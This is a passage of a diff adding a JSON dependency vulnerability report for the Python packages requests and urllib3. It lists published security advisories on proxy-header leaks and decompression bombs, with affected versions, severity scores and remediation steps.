+                "0.2.4",
+                "0.3.0",
+                "0.3.1",
+                "0.3.2",
+                "0.3.3",
+                "0.3.4",
+                "0.4.0",
+                "0.4.1",
+                "0.5.0",
+                "0.5.1",
+                "0.6.0",
+                "0.6.1",
+                "0.6.2",
+                "0.6.3",
+                "0.6.4",
+                "0.6.5",
+                "0.6.6",
+                "0.7.0",
+                "0.7.1",
+                "0.7.2",
+                "0.7.3",
+                "0.7.4",
+                "0.7.5",
+                "0.7.6",
+                "0.8.0",
+                "0.8.1",
+                "0.8.2",
+                "0.8.3",
+                "0.8.4",
+                "0.8.5",
+                "0.8.6",
+                "0.8.7",
+                "0.8.8",
+                "0.8.9",
+                "0.9.0",
+                "0.9.1",
+                "0.9.2",
+                "0.9.3",
+                "1.0.0",
+                "1.0.1",
+                "1.0.2",
+                "1.0.3",
+                "1.0.4",
+                "1.1.0",
+                "1.2.0",
+                "1.2.1",
+                "1.2.2",
+                "1.2.3",
+                "2.0.0",
+                "2.0.1",
+                "2.1.0",
+                "2.10.0",
+                "2.11.0",
+                "2.11.1",
+                "2.12.0",
+                "2.12.1",
+                "2.12.2",
+                "2.12.3",
+                "2.12.4",
+                "2.12.5",
+                "2.13.0",
+                "2.14.0",
+                "2.14.1",
+                "2.14.2",
+                "2.15.0",
+                "2.15.1",
+                "2.16.0",
+                "2.16.1",
+                "2.16.2",
+                "2.16.3",
+                "2.16.4",
+                "2.16.5",
+                "2.17.0",
+                "2.17.1",
+                "2.17.2",
+                "2.17.3",
+                "2.18.0",
+                "2.18.1",
+                "2.18.2",
+                "2.18.3",
+                "2.18.4",
+                "2.19.0",
+                "2.19.1",
+                "2.2.0",
+                "2.2.1",
+                "2.20.0",
+                "2.20.1",
+                "2.21.0",
+                "2.22.0",
+                "2.23.0",
+                "2.24.0",
+                "2.25.0",
+                "2.25.1",
+                "2.26.0",
+                "2.27.0",
+                "2.27.1",
+                "2.28.0",
+                "2.28.1",
+                "2.28.2",
+                "2.29.0",
+                "2.3.0",
+                "2.30.0",
+                "2.31.0",
+                "2.4.0",
+                "2.4.1",
+                "2.4.2",
+                "2.4.3",
+                "2.5.0",
+                "2.5.1",
+                "2.5.2",
+                "2.5.3",
+                "2.6.0",
+                "2.6.1",
+                "2.6.2",
+                "2.7.0",
+                "2.8.0",
+                "2.8.1",
+                "2.9.0",
+                "2.9.1",
+                "2.9.2"
+              ],
+              "database_specific": {
+                "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/05/GHSA-9wx4-h78v-vm56/GHSA-9wx4-h78v-vm56.json"
+              }
+            }
+          ],
+          "schema_version": "1.7.3",
+          "severity": [
+            {
+              "type": "CVSS_V3",
+              "score": "CVSS:3.1/AV:L/AC:H/PR:H/UI:R/S:U/C:H/I:H/A:N"
+            }
+          ]
+        },
+        {
+          "id": "GHSA-j8r2-6x86-q33q",
+          "summary": "Unintended leak of Proxy-Authorization header in requests",
+          "details": "### Impact\n\nSince Requests v2.3.0, Requests has been vulnerable to potentially leaking `Proxy-Authorization` headers to destination servers, specifically during redirects to an HTTPS origin. This is a product of how `rebuild_proxies` is used to recompute and [reattach the `Proxy-Authorization` header](https://github.com/psf/requests/blob/f2629e9e3c7ce3c3c8c025bcd8db551101cbc773/requests/sessions.py#L319-L328) to requests when redirected. Note this behavior has _only_ been observed to affect proxied requests when credentials are supplied in the URL user information component (e.g. `https://username:password@proxy:8080`).\n\n**Current vulnerable behavior(s):**\n\n1. HTTP → HTTPS: **leak**\n2. HTTPS → HTTP: **no leak**\n3. HTTPS → HTTPS: **leak**\n4. HTTP → HTTP: **no leak**\n\nFor HTTP connections sent through the proxy, the proxy will identify the header in the request itself and remove it prior to forwarding to the destination server. However when sent over HTTPS, the `Proxy-Authorization` header must be sent in the CONNECT request as the proxy has no visibility into further tunneled requests. This results in Requests forwarding the header to the destination server unintentionally, allowing a malicious actor to potentially exfiltrate those credentials.\n\nThe reason this currently works for HTTPS connections in Requests is the `Proxy-Authorization` header is also handled by urllib3 with our usage of the ProxyManager in adapters.py with [`proxy_manager_for`](https://github.com/psf/requests/blob/f2629e9e3c7ce3c3c8c025bcd8db551101cbc773/requests/adapters.py#L199-L235). This will compute the required proxy headers in `proxy_headers` and pass them to the Proxy Manager, avoiding attaching them directly to the Request object. This will be our preferred option going forward for default usage.\n\n### Patches\nStarting in Requests v2.31.0, Requests will no longer attach this header to redirects with an HTTPS destination. This should have no negative impacts on the default behavior of the library as the proxy credentials are already properly being handled by urllib3's ProxyManager.\n\nFor users with custom adapters, this _may_ be potentially breaking if you were already working around this behavior. The previous functionality of `rebuild_proxies` doesn't make sense in any case, so we would encourage any users impacted to migrate any handling of Proxy-Authorization directly into their custom adapter.\n\n### Workarounds\nFor users who are not able to update Requests immediately, there is one potential workaround.\n\nYou may disable redirects by setting `allow_redirects` to `False` on all calls through Requests top-level APIs. Note that if you're currently relying on redirect behaviors, you will need to capture the 3xx response codes and ensure a new request is made to the redirect destination.\n```\nimport requests\nr = requests.get('http://github.com/', allow_redirects=False)\n```\n\n### Credits\n\nThis vulnerability was discovered and disclosed by the following individuals.\n\nDennis Brinkrolf, Haxolot (https://haxolot.com/)\nTobias Funke, (tobiasfunke93@gmail.com)",
+          "aliases": [
+            "CVE-2023-32681",
+            "PYSEC-2023-74"
+          ],
+          "modified": "2026-02-04T03:34:13.807518Z",
+          "published": "2023-05-22T20:36:32Z",
+          "related": [
+            "CGA-qx6h-cqcr-93vf"
+          ],
+          "database_specific": {
+            "cwe_ids": [
+              "CWE-200"
+            ],
+            "github_reviewed": true,
+            "severity": "MODERATE",
+            "github_reviewed_at": "2023-05-22T20:36:32Z",
+            "nvd_published_at": "2023-05-26T18:15:14Z"
+          },
+          "references": [
+            {
+              "type": "WEB",
+              "url": "https://github.com/psf/requests/security/advisories/GHSA-j8r2-6x86-q33q"
+            },
+            {
+              "type": "ADVISORY",
+              "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-32681"
+            },
+            {
+              "type": "WEB",
+              "url": "https://github.com/psf/requests/commit/74ea7cf7a6a27a4eeb2ae24e162bcc942a6706d5"
+            },
+            {
+              "type": "PACKAGE",
+              "url": "https://github.com/psf/requests"
+            },
+            {
+              "type": "WEB",
+              "url": "https://github.com/psf/requests/releases/tag/v2.31.0"
+            },
+            {
+              "type": "WEB",
+              "url": "https://github.com/pypa/advisory-database/tree/main/vulns/requests/PYSEC-2023-74.yaml"
+            },
+            {
+              "type": "WEB",
+              "url": "https://lists.debian.org/debian-lts-announce/2023/06/msg00018.html"
+            },
+            {
+              "type": "WEB",
+              "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/AW7HNFGYP44RT3DUDQXG2QT3OEV2PJ7Y"
+            },
+            {
+              "type": "WEB",
+              "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/KOYASTZDGQG2BWLSNBPL3TQRL2G7QYNZ"
+            },
+            {
+              "type": "WEB",
+              "url": "https://security.gentoo.org/glsa/202309-08"
+            }
+          ],
+          "affected": [
+            {
+              "package": {
+                "name": "requests",
+                "ecosystem": "PyPI",
+                "purl": "pkg:pypi/requests"
+              },
+              "ranges": [
+                {
+                  "type": "ECOSYSTEM",
+                  "events": [
+                    {
+                      "introduced": "2.3.0"
+                    },
+                    {
+                      "fixed": "2.31.0"
+                    }
+                  ]
+                }
+              ],
+              "versions": [
+                "2.10.0",
+                "2.11.0",
+                "2.11.1",
+                "2.12.0",
+                "2.12.1",
+                "2.12.2",
+                "2.12.3",
+                "2.12.4",
+                "2.12.5",
+                "2.13.0",
+                "2.14.0",
+                "2.14.1",
+                "2.14.2",
+                "2.15.0",
+                "2.15.1",
+                "2.16.0",
+                "2.16.1",
+                "2.16.2",
+                "2.16.3",
+                "2.16.4",
+                "2.16.5",
+                "2.17.0",
+                "2.17.1",
+                "2.17.2",
+                "2.17.3",
+                "2.18.0",
+                "2.18.1",
+                "2.18.2",
+                "2.18.3",
+                "2.18.4",
+                "2.19.0",
+                "2.19.1",
+                "2.20.0",
+                "2.20.1",
+                "2.21.0",
+                "2.22.0",
+                "2.23.0",
+                "2.24.0",
+                "2.25.0",
+                "2.25.1",
+                "2.26.0",
+                "2.27.0",
+                "2.27.1",
+                "2.28.0",
+                "2.28.1",
+                "2.28.2",
+                "2.29.0",
+                "2.3.0",
+                "2.30.0",
+                "2.4.0",
+                "2.4.1",
+                "2.4.2",
+                "2.4.3",
+                "2.5.0",
+                "2.5.1",
+                "2.5.2",
+                "2.5.3",
+                "2.6.0",
+                "2.6.1",
+                "2.6.2",
+                "2.7.0",
+                "2.8.0",
+                "2.8.1",
+                "2.9.0",
+                "2.9.1",
+                "2.9.2"
+              ],
+              "database_specific": {
+                "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2023/05/GHSA-j8r2-6x86-q33q/GHSA-j8r2-6x86-q33q.json"
+              }
+            }
+          ],
+          "schema_version": "1.7.3",
+          "severity": [
+            {
+              "type": "CVSS_V3",
+              "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:N/A:N"
+            }
+          ]
+        },
+        {
+          "id": "PYSEC-2023-74",
+          "details": "Requests is a HTTP library. Since Requests 2.3.0, Requests has been leaking Proxy-Authorization headers to destination servers when redirected to an HTTPS endpoint. This is a product of how we use `rebuild_proxies` to reattach the `Proxy-Authorization` header to requests. For HTTP connections sent through the tunnel, the proxy will identify the header in the request itself and remove it prior to forwarding to the destination server. However when sent over HTTPS, the `Proxy-Authorization` header must be sent in the CONNECT request as the proxy has no visibility into the tunneled request. This results in Requests forwarding proxy credentials to the destination server unintentionally, allowing a malicious actor to potentially exfiltrate sensitive information. This issue has been patched in version 2.31.0.\n\n",
+          "aliases": [
+            "CVE-2023-32681",
+            "GHSA-j8r2-6x86-q33q"
+          ],
+          "modified": "2023-11-08T04:12:35.436175Z",
+          "published": "2023-05-26T18:15:00Z",
+          "references": [
+            {
+              "type": "ADVISORY",
+              "url": "https://github.com/psf/requests/security/advisories/GHSA-j8r2-6x86-q33q"
+            },
+            {
+              "type": "WEB",
+              "url": "https://github.com/psf/requests/releases/tag/v2.31.0"
+            },
+            {
+              "type": "FIX",
+              "url": "https://github.com/psf/requests/commit/74ea7cf7a6a27a4eeb2ae24e162bcc942a6706d5"
+            },
+            {
+              "type": "WEB",
+              "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/AW7HNFGYP44RT3DUDQXG2QT3OEV2PJ7Y/"
+            }
+          ],
+          "affected": [
+            {
+              "package": {
+                "name": "requests",
+                "ecosystem": "PyPI",
+                "purl": "pkg:pypi/requests"
+              },
+              "ranges": [
+                {
+                  "type": "GIT",
+                  "repo": "https://github.com/psf/requests",
+                  "events": [
+                    {
+                      "introduced": "0"
+                    },
+                    {
+                      "fixed": "74ea7cf7a6a27a4eeb2ae24e162bcc942a6706d5"
+                    }
+                  ]
+                },
+                {
+                  "type": "ECOSYSTEM",
+                  "events": [
+                    {
+                      "introduced": "2.3.0"
+                    },
+                    {
+                      "fixed": "2.31.0"
+                    }
+                  ]
+                }
+              ],
+              "versions": [
+                "2.10.0",
+                "2.11.0",
+                "2.11.1",
+                "2.12.0",
+                "2.12.1",
+                "2.12.2",
+                "2.12.3",
+                "2.12.4",
+                "2.12.5",
+                "2.13.0",
+                "2.14.0",
+                "2.14.1",
+                "2.14.2",
+                "2.15.0",
+                "2.15.1",
+                "2.16.0",
+                "2.16.1",
+                "2.16.2",
+                "2.16.3",
+                "2.16.4",
+                "2.16.5",
+                "2.17.0",
+                "2.17.1",
+                "2.17.2",
+                "2.17.3",
+                "2.18.0",
+                "2.18.1",
+                "2.18.2",
+                "2.18.3",
+                "2.18.4",
+                "2.19.0",
+                "2.19.1",
+                "2.20.0",
+                "2.20.1",
+                "2.21.0",
+                "2.22.0",
+                "2.23.0",
+                "2.24.0",
+                "2.25.0",
+                "2.25.1",
+                "2.26.0",
+                "2.27.0",
+                "2.27.1",
+                "2.28.0",
+                "2.28.1",
+                "2.28.2",
+                "2.29.0",
+                "2.3.0",
+                "2.30.0",
+                "2.4.0",
+                "2.4.1",
+                "2.4.2",
+                "2.4.3",
+                "2.5.0",
+                "2.5.1",
+                "2.5.2",
+                "2.5.3",
+                "2.6.0",
+                "2.6.1",
+                "2.6.2",
+                "2.7.0",
+                "2.8.0",
+                "2.8.1",
+                "2.9.0",
+                "2.9.1",
+                "2.9.2"
+              ],
+              "database_specific": {
+                "source": "https://github.com/pypa/advisory-database/blob/main/vulns/requests/PYSEC-2023-74.yaml"
+              }
+            }
+          ],
+          "schema_version": "1.7.3"
+        }
+      ],
+      "vulnerability_count": 4,
+      "has_vulnerabilities": true,
+      "query_time": "2026-03-05T18:11:28.681523"
+    },
+    {
+      "name": "urllib3",
+      "version": "1.26.8",
+      "purl": "pkg:pypi/urllib3@1.26.8",
+      "type": "library",
+      "bom-ref": "pkg:pypi/urllib3@1.26.8",
+      "group": "",
+      "description": "HTTP library with thread-safe connection pooling, file post, and more.",
+      "licenses": [
+        {
+          "license": {
+            "id": "MIT",
+            "url": "https://opensource.org/licenses/MIT"
+          }
+        }
+      ],
+      "hashes": [],
+      "scope": null,
+      "evidence": {
+        "identity": [
+          {
+            "field": "purl",
+            "confidence": 1,
+            "methods": [
+              {
+                "technique": "manifest-analysis",
+                "confidence": 0.5,
+                "value": "data/repos/public-apis_public-apis/scripts/requirements.txt"
+              },
+              {
+                "technique": "instrumentation",
+                "confidence": 1,
+                "value": "cdxgen-venv-3Xn6F4"
+              }
+            ]
+          }
+        ]
+      },
+      "properties": [
+        {
+          "name": "SrcFile",
+          "value": "data/repos/public-apis_public-apis/scripts/requirements.txt"
+        }
+      ],
+      "vulnerabilities": [
+        {
+          "id": "GHSA-2xpw-w6gg-jr37",
+          "summary": "urllib3 streaming API improperly handles highly compressed data",
+          "details": "### Impact\n\nurllib3's [streaming API](https://urllib3.readthedocs.io/en/2.5.0/advanced-usage.html#streaming-and-i-o) is designed for the efficient handling of large HTTP responses by reading the content in chunks, rather than loading the entire response body into memory at once.\n\nWhen streaming a compressed response, urllib3 can perform decoding or decompression based on the HTTP `Content-Encoding` header (e.g., `gzip`, `deflate`, `br`, or `zstd`). The library must read compressed data from the network and decompress it until the requested chunk size is met. Any resulting decompressed data that exceeds the requested amount is held in an internal buffer for the next read operation.\n\nThe decompression logic could cause urllib3 to fully decode a small amount of highly compressed data in a single operation. This can result in excessive resource consumption (high CPU usage and massive memory allocation for the decompressed data; CWE-409) on the client side, even if the application only requested a small chunk of data.\n\n\n### Affected usages\n\nApplications and libraries using urllib3 version 2.5.0 and earlier to stream large compressed responses or content from untrusted sources.\n\n`stream()`, `read(amt=256)`, `read1(amt=256)`, `read_chunked(amt=256)`, `readinto(b)` are examples of `urllib3.HTTPResponse` method calls using the affected logic unless decoding is disabled explicitly.\n\n\n### Remediation\n\nUpgrade to at least urllib3 v2.6.0 in which the library avoids decompressing data that exceeds the requested amount.\n\nIf your environment contains a package facilitating the Brotli encoding, upgrade to at least Brotli 1.2.0 or brotlicffi 1.2.0.0 too. These versions are enforced by the `urllib3[brotli]` extra in the patched versions of urllib3.\n\n\n### Credits\n\nThe issue was reported by @Cycloctane.\nSupplemental information was provided by @stamparm during a security audit performed by [7ASecurity](https://7asecurity.com/) and facilitated by [OSTIF](https://ostif.org/).",
+          "aliases": [
+            "CVE-2025-66471"
+          ],
+          "modified": "2026-02-04T02:36:12.983430Z",
+          "published": "2025-12-05T18:15:54Z",
+          "related": [
+            "CGA-3vv3-3897-wc6m"
+          ],
+          "database_specific": {
+            "nvd_published_at": "2025-12-05T17:16:04Z",
+            "severity": "HIGH",
+            "cwe_ids": [
+              "CWE-409"
+            ],
+            "github_reviewed": true,
+            "github_reviewed_at": "2025-12-05T18:15:54Z"
+          },
+          "references": [
+            {
+              "type": "WEB",
+              "url": "https://github.com/urllib3/urllib3/security/advisories/GHSA-2xpw-w6gg-jr37"
+            },
+            {
+              "type": "ADVISORY",
+              "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-66471"
+            },
+            {
+              "type": "WEB",
+              "url": "https://github.com/urllib3/urllib3/commit/c19571de34c47de3a766541b041637ba5f716ed7"
+            },
+            {
+              "type": "PACKAGE",
+              "url": "https://github.com/urllib3/urllib3"
+            }
+          ],
+          "affected": [
+            {
+              "package": {
+                "name": "urllib3",
+                "ecosystem": "PyPI",
+                "purl": "pkg:pypi/urllib3"
+              },
+              "ranges": [
+                {
+                  "type": "ECOSYSTEM",
+                  "events": [
+                    {
+                      "introduced": "1.0"
+                    },
+                    {
+                      "fixed": "2.6.0"
+                    }
+                  ]
+                }
+              ],
+              "versions": [
+                "1.0",
+                "1.0.1",
+                "1.0.2",
+                "1.1",
+                "1.10",
+                "1.10.1",
+                "1.10.2",
+                "1.10.3",
+                "1.10.4",
+                "1.11",
+                "1.12",
+                "1.13",
+                "1.13.1",
+                "1.14",
+                "1.15",
+                "1.15.1",
+                "1.16",
+                "1.17",
+                "1.18",
+                "1.18.1",
+                "1.19",
+                "1.19.1",
+                "1.2",
+                "1.2.1",
+                "1.2.2",
+                "1.20",
+                "1.21",
+                "1.21.1",
+                "1.22",
+                "1.23",
+                "1.24",
+                "1.24.1",
+                "1.24.2",
+                "1.24.3",
+                "1.25",
+                "1.25.1",
+                "1.25.10",
+                "1.25.11",
+                "1.25.2",
+                "1.25.3",
+                "1.25.4",
+                "1.25.5",
+                "1.25.6",
+                "1.25.7",
+                "1.25.8",
+                "1.25.9",
+                "1.26.0",
+                "1.26.1",
+                "1.26.10",
+                "1.26.11",
+                "1.26.12",
+                "1.26.13",
+                "1.26.14",
+                "1.26.15",
+                "1.26.16",
+                "1.26.17",
+                "1.26.18",
+                "1.26.19",
+                "1.26.2",
+                "1.26.20",
+                "1.26.3",
+                "1.26.4",
+                "1.26.5",
+                "1.26.6",
+                "1.26.7",
+                "1.26.8",
+                "1.26.9",
+                "1.3",
+                "1.4",
+                "1.5",
+                "1.6",
+                "1.7",
+                "1.7.1",
+                "1.8",
+                "1.8.2",
+                "1.8.3",
+                "1.9",
+                "1.9.1",
+                "2.0.0",
+                "2.0.0a1",
+                "2.0.0a2",
+                "2.0.0a3",
+                "2.0.0a4",
+                "2.0.1",
+                "2.0.2",
+                "2.0.3",
+                "2.0.4",
+                "2.0.5",
+                "2.0.6",
+                "2.0.7",
+                "2.1.0",
+                "2.2.0",
+                "2.2.1",
+                "2.2.2",
+                "2.2.3",
+                "2.3.0",
+                "2.4.0",
+                "2.5.0"
+              ],
+              "database_specific": {
+                "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/12/GHSA-2xpw-w6gg-jr37/GHSA-2xpw-w6gg-jr37.json"
+              }
+            }
+          ],
+          "schema_version": "1.7.3",
+          "severity": [
+            {
+              "type": "CVSS_V4",
+              "score": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:H"
+            }
+          ]
+        },
+        {
+          "id": "GHSA-34jh-p97f-mpxf",
+          "summary": "urllib3's Proxy-Authorization request header isn't stripped during cross-origin redirects",
+          "details": "When using urllib3's proxy support with `ProxyManager`, the `Proxy-Authorization` header is only sent to the configured proxy, as expected.\n\nHowever, when sending HTTP requests *without* using urllib3's proxy support, it's possible to accidentally configure the `Proxy-Authorization` header even though it won't have any effect as the request is not using a forwarding proxy or a tunneling proxy. In those cases, urllib3 doesn't treat the `Proxy-Authorization` HTTP header as one carrying authentication material and thus doesn't strip the header on cross-origin redirects.\n\nBecause this is a highly unlikely scenario, we believe the severity of this vulnerability is low for almost all users. Out of an abundance of caution urllib3 will automatically strip the `Proxy-Authorization` header during cross-origin redirects to avoid the small chance that users are doing this on accident.\n\nUsers should use urllib3's proxy support or disable automatic redirects to achieve safe processing of the `Proxy-Authorization` header, but we still decided to strip the header by default in order to further protect users who aren't using the correct approach.\n\n## Affected usages\n\nWe believe the number of usages affected by this advisory is low. It requires all of the following to be true to be exploited:\n\n* Setting the `Proxy-Authorization` header without using urllib3's built-in proxy support.\n* Not disabling HTTP redirects.\n* Either not using an HTTPS origin server or for the proxy or target origin to redirect to a malicious origin.\n\n## Remediation\n\n* Using the `Proxy-Authorization` header with urllib3's `ProxyManager`.\n* Disabling HTTP redirects using `redirects=False` when sending requests.\n* Not using the `Proxy-Authorization` header.",
+          "aliases": [
+            "CVE-2024-37891"
+          ],
+          "modified": "2026-02-04T03:37:44.850742Z",
+          "published": "2024-06-17T21:37:20Z",
+          "related": [
+            "CGA-8p56-2w27-7ccq"
+          ],
+          "database_specific": {
+            "severity": "MODERATE",
+            "nvd_published_at": "2024-06-17T20:15:13Z",
+            "github_reviewed": true,
+            "github_reviewed_at": "2024-06-17T21:37:20Z",
+            "cwe_ids": [
+              "CWE-669"
+            ]
+          },
+          "references": [
+            {
+              "type": "WEB",
+              "url": "https://github.com/urllib3/urllib3/security/advisories/GHSA-34jh-p97f-mpxf"
+            },
+            {
+              "type": "ADVISORY",
+              "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-37891"
+            },
+            {
+              "type": "WEB",
+              "url": "https://github.com/urllib3/urllib3/commit/40b6d1605814dd1db0a46e202d6e56f2e4c9a468"
+            },
+            {
+              "type": "WEB",
+              "url": "https://github.com/urllib3/urllib3/commit/accff72ecc2f6cf5a76d9570198a93ac7c90270e"
+            },
+            {
+              "type": "PACKAGE",
+              "url": "https://github.com/urllib3/urllib3"
+            },
+            {
+              "type": "WEB",
+              "url": "https://lists.debian.org/debian-lts-announce/2024/12/msg00020.html"
+            },
+            {
+              "type": "WEB",
+              "url": "https://security.netapp.com/advisory/ntap-20240822-0003"
+            },
+            {
+              "type": "WEB",
+              "url": "https://www.vicarius.io/vsociety/posts/proxy-authorization-header-handling-vulnerability-in-urllib3-cve-2024-37891"
+            }
+          ],
+          "affected": [
+            {
+              "package": {
+                "name": "urllib3",
+                "ecosystem": "PyPI",
+                "purl": "pkg:pypi/urllib3"
+              },
+              "ranges": [
+                {
+                  "type": "ECOSYSTEM",
+                  "events": [
+                    {
+                      "introduced": "0"
+                    },
+                    {
+                      "fixed": "1.26.19"
+                    }
+                  ]
+                }
+              ],
+              "versions": [
+                "0.2",
+                "0.3",
+                "0.3.1",
+                "0.4.0",
+                "0.4.1",
+                "1.0",
+                "1.0.1",
+                "1.0.2",
+                "1.1",
+                "1.10",
+                "1.10.1",
+                "1.10.2",
+                "1.10.3",
+                "1.10.4",
+                "1.11",
+                "1.12",
+                "1.13",
+                "1.13.1",
+                "1.14",
+                "1.15",
+                "1.15.1",
+                "1.16",
+                "1.17",
+                "1.18",
+                "1.18.1",
+                "1.19",
+                "1.19.1",
+                "1.2",
+                "1.2.1",
+                "1.2.2",
+                "1.20",
+                "1.21",
+                "1.21.1",
+                "1.22",
+                "1.23",
+                "1.24",
+                "1.24.1",
+                "1.24.2",
+                "1.24.3",
+                "1.25",
+                "1.25.1",
+                "1.25.10",
+                "1.25.11",
+                "1.25.2",
+                "1.25.3",
+                "1.25.4",
+                "1.25.5",
+                "1.25.6",
+                "1.25.7",
+                "1.25.8",
+                "1.25.9",
+                "1.26.0",
+                "1.26.1",
+                "1.26.10",
+                "1.26.11",
+                "1.26.12",
+                "1.26.13",
+                "1.26.14",
+                "1.26.15",
+                "1.26.16",
+                "1.26.17",
+                "1.26.18",
+                "1.26.2",
+                "1.26.3",
+                "1.26.4",
+                "1.26.5",
+                "1.26.6",
+                "1.26.7",
+                "1.26.8",
+                "1.26.9",
+                "1.3",
+                "1.4",
+                "1.5",
+                "1.6",
+                "1.7",
+                "1.7.1",
+                "1.8",
+                "1.8.2",
+                "1.8.3",
+                "1.9",
+                "1.9.1"
+              ],
+              "database_specific": {
+                "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/06/GHSA-34jh-p97f-mpxf/GHSA-34jh-p97f-mpxf.json"
+              }
+            },
+            {
+              "package": {
+                "name": "urllib3",
+                "ecosystem": "PyPI",
+                "purl": "pkg:pypi/urllib3"
+              },
+              "ranges": [
+                {
+                  "type": "ECOSYSTEM",
+                  "events": [
+                    {
+                      "introduced": "2.0.0"
+                    },
+                    {
+                      "fixed": "2.2.2"
+                    }
+                  ]
+                }
+              ],
+              "versions": [
+                "2.0.0",
+                "2.0.1",
+                "2.0.2",
+                "2.0.3",
+                "2.0.4",
+                "2.0.5",
+                "2.0.6",
+                "2.0.7",
+                "2.1.0",
+                "2.2.0",
+                "2.2.1"
+              ],
+              "database_specific": {
+                "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/06/GHSA-34jh-p97f-mpxf/GHSA-34jh-p97f-mpxf.json"
+              }
+            }
+          ],
+          "schema_version": "1.7.3",
+          "severity": [
+            {
+              "type": "CVSS_V3",
+              "score": "CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:U/C:H/I:N/A:N"
+            }
+          ]
+        },
+        {
+          "id": "GHSA-38jv-5279-wg99",
+          "summary": "Decompression-bomb safeguards bypassed when following HTTP redirects (streaming API)",
+          "details": "### Impact\n\nurllib3's [streaming API](https://urllib3.readthedocs.io/en/2.6.2/advanced-usage.html#streaming-and-i-o) is designed for the efficient handling of large HTTP responses by reading the content in chunks, rather than loading the entire response body into memory at once.\n\nurllib3 can perform decoding or decompression based on the HTTP `Content-Encoding` header (e.g., `gzip`, `deflate`, `br`, or `zstd`). When using the streaming API, the library decompresses only the necessary bytes, enabling partial content consumption.\n\nHowever, for HTTP redirect responses, the library would read the entire response body to drain the connection and decompress the content unnecessarily. This decompression occurred even before any read methods were called, and configured read limits did not restrict the amount of decompressed data. As a result, there was no safeguard against decompression bombs. A malicious server could exploit this to trigger excessive resource consumption on the client (high CPU usage and large memory allocations for decompressed data; CWE-409).\n\n### Affected usages\n\nApplications and libraries using urllib3 version 2.6.2 and earlier to stream content from untrusted sources by setting `preload_content=False` when they do not disable redirects.\n\n\n### Remediation\n\nUpgrade to at least urllib3 v2.6.3 in which the library does not decode content of redirect responses when `preload_content=False`.\n\nIf upgrading is not immediately possible, disable [redirects](https://urllib3.readthedocs.io/en/2.6.2/user-guide.html#retrying-requests) by setting `redirect=False` for requests to untrusted source.",
+          "aliases": [
+            "CVE-2026-21441"
+          ],
+          "modified": "2026-02-04T03:51:36.162029Z",
+          "published": "2026-01-07T19:18:14Z",
+          "related": [
+            "CGA-xfvm-vv8w-pq2j"
+          ],
+          "database_specific": {
+            "nvd_published_at": "2026-01-07T22:15:44Z",
+            "severity": "HIGH",
+            "cwe_ids": [
+              "CWE-409"
+            ],
+            "github_reviewed": true,
+            "github_reviewed_at": "2026-01-07T19:18:14Z"
+          },
+          "references": [
+            {
+              "type": "WEB",
+              "url": "https://github.com/urllib3/urllib3/security/advisories/GHSA-38jv-5279-wg99"
+            },
+            {
+              "type": "ADVISORY",
+              "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-21441"
+            },
+            {
+              "type": "WEB",
+              "url": "https://github.com/urllib3/urllib3/commit/8864ac407bba8607950025e0979c4c69bc7abc7b"
+            },
+            {
+              "type": "PACKAGE",
+              "url": "https://github.com/urllib3/urllib3"
+            },
+            {
+              "type": "WEB",
+              "url": "https://lists.debian.org/debian-lts-announce/2026/01/msg00017.html"
+            }
+          ],
+          "affected": [
+            {
+              "package": {
+                "name": "urllib3",
+                "ecosystem": "PyPI",
+                "purl": "pkg:pypi/urllib3"
+              },
+              "ranges": [
+                {
+                  "type": "ECOSYSTEM",
+                  "events": [
+                    {
+                      "introduced": "1.22"
+                    },
+                    {
+                      "fixed": "2.6.3"
+                    }
+                  ]
+                }
+              ],
+              "versions": [
+                "1.22",
+                "1.23",
+                "1.24",
+                "1.24.1",
+                "1.24.2",
+                "1.24.3",
+                "1.25",
+                "1.25.1",
+                "1.25.10",
+                "1.25.11",
+                "1.25.2",
+                "1.25.3",
+                "1.25.4",
+                "1.25.5",
+                "1.25.6",
+                "1.25.7",
+                "1.25.8",
+                "1.25.9",
+                "1.26.0",
+                "1.26.1",
+                "1.26.10",
+                "1.26.11",
+                "1.26.12",
+                "1.26.13",
+                "1.26.14",
+                "1.26.15",
+                "1.26.16",
+                "1.26.17",
+                "1.26.18",
+                "1.26.19",
+                "1.26.2",
+                "1.26.20",
+                "1.26.3",
+                "1.26.4",
+                "1.26.5",
+                "1.26.6",
+                "1.26.7",
+                "1.26.8",
+                "1.26.9",
+                "2.0.0",
+                "2.0.0a1",
+                "2.0.0a2",
+                "2.0.0a3",
+                "2.0.0a4",
+                "2.0.1",
+                "2.0.2",
+                "2.0.3",
+                "2.0.4",
+                "2.0.5",
+                "2.0.6",
+                "2.0.7",
+                "2.1.0",
+                "2.2.0",
+                "2.2.1",
+                "2.2.2",
+                "2.2.3",
+                "2.3.0",
+                "2.4.0",
+                "2.5.0",
+                "2.6.0",
+                "2.6.1",
+                "2.6.2"
+              ],
+              "database_specific": {
+                "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/01/GHSA-38jv-5279-wg99/GHSA-38jv-5279-wg99.json"
+              }
+            }
+          ],
+          "schema_version": "1.7.3",
+          "severity": [
+            {
+              "type": "CVSS_V3",
+              "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+            },
+            {
+              "type": "CVSS_V4",
+              "score": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:H"
+            }
+          ]
+        },
+        {
+          "id": "GHSA-g4mx-q9vg-27p4",
+          "summary": "urllib3's request body not stripped after redirect from 303 status changes request method to GET",
